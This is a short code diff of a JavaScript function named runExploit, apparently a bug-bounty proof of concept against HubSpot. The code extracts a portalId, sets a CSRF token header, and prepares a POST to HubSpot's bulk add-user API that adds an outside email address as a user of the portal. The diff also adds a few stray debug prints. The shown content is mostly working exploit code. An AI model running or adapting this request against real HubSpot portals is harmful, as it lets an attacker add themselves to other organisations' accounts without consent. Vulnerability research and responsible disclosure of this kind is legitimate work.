@@ -51,15 +51,15 @@ function runExploit() {
   portalId = json.basicAccounts?.[0]?.id
   log(`[+] Extracted portalId: ${portalId}`);
 } catch (e) {
-  log("[-] Failed to parse portalId:", e);
+  log("[-] Failed to parse portalId: " + e.message);
   return;
 }
-
+console.log("hello");
       if (!portalId) {
         log("[-] No portalId found.");
         return;
       }
-
+console.log("hello");
       // Step 2: POST add user
       const xhr2 = new XMLHttpRequest();
       const postUrl = `https://app-eu1.hubspot.com/api/app-users/v1/users/add/bulk?portalId=${portalId}`;
@@ -69,7 +69,7 @@ function runExploit() {
       if (csrfToken) {
         xhr2.setRequestHeader("X-Hubspot-Csrf-Hubspotapi", csrfToken);
       }
-
+console.log("hello");
       const userData = {
         users: [{ email: "dangerhm+3@wearehackerone.com" }],
         seatNames: ["service-professional-trial"],
